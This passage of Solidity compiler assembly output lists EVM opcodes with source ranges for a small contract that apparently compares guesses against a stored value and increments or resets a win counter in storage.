											"name": "SHR",
											"source": 0
										},
										{
											"begin": 412,
											"end": 469,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 412,
											"end": 469,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 494,
											"end": 504,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 482,
											"end": 490,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 482,
											"end": 490,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 482,
											"end": 504,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 478,
											"end": 531,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 515,
											"end": 523,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 515,
											"end": 523,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 515,
											"end": 523,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 478,
											"end": 531,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 550,
											"end": 560,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 547,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 539,
											"end": 560,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 567,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 599,
											"end": 605,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 599,
											"end": 605,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 596,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 567,
											"end": 605,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 567,
											"end": 605,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 612,
											"end": 621,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 636,
											"end": 637,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 624,
											"end": 632,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 624,
											"end": 637,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 624,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 647,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 624,
											"end": 652,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 640,
											"end": 644,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 612,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 612,
											"end": 652,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 673,
											"end": 679,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 669,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 661,
											"end": 798,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 690,
											"end": 705,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 690,
											"end": 705,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 723,
											"end": 727,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 716,
											"end": 727,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 716,
											"end": 727,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 661,
											"end": 798,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 768,
											"end": 769,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 750,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 778,
											"end": 790,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 50,
											"end": 55,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 94,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 75,
											"end": 95,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 128,
											"end": 133,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 146,
											"end": 469,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 146,
											"end": 469,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 202,
											"end": 208,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 253,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 239,
											"end": 248,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 230,
											"end": 237,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 226,
											"end": 249,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 222,
											"end": 254,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 338,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 257,
											"end": 336,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 338,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 377,
											"end": 378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 444,
											"end": 451,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 435,
											"end": 441,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 424,
											"end": 433,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 420,
											"end": 442,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 402,
											"end": 452,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 392,
											"end": 452,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 392,
											"end": 452,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 348,
											"end": 462,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 475,
											"end": 584,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 475,
											"end": 584,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 556,
											"end": 577,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 571,
											"end": 576,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 556,
											"end": 577,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 551,
											"end": 554,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 544,
											"end": 578,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 590,
											"end": 708,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 590,
											"end": 708,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 677,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 695,
											"end": 700,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 677,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 672,
											"end": 675,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 665,
											"end": 702,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 714,
											"end": 924,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 714,
											"end": 924,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 801,
											"end": 805,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 839,
											"end": 841,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 828,
											"end": 837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 824,
											"end": 842,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 816,
											"end": 842,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 816,
											"end": 842,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 852,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 914,
											"end": 915,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 903,
											"end": 912,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 899,
											"end": 916,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 890,
											"end": 896,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 852,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1027,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1061,
											"end": 1063,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1050,
											"end": 1059,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1046,
											"end": 1064,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1064,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1064,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1142,
											"end": 1143,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1131,
											"end": 1140,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1127,
											"end": 1144,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1118,
											"end": 1124,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1279,
											"end": 1280,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1314,
											"end": 1315,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1291,
											"end": 1316,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1291,
											"end": 1316,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1348,
											"end": 1349,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1350,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1350,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1369,
											"end": 1370,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "tag",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1416,
											"end": 1417,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1413,
											"end": 1414,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1409,
											"end": 1418,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1404,
											"end": 1418,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1404,
											"end": 1418,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1470,
											"end": 1474,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1508,
											"end": 1509,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1510,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1542,
											"end": 1543,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "tag",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1544,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1544,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1563,
											"end": 1564,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1560,
											"end": 1561,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1557,
											"end": 1565,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1613,
											"end": 1614,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1610,
											"end": 1611,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1606,
											"end": 1615,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1598,
											"end": 1615,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1598,
											"end": 1615,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1661,
											"end": 1668,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1704,
											"end": 1709,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1697,
											"end": 1710,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1690,
											"end": 1711,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1679,
											"end": 1711,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1679,
											"end": 1711,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "POP",
											"source": 1
										},
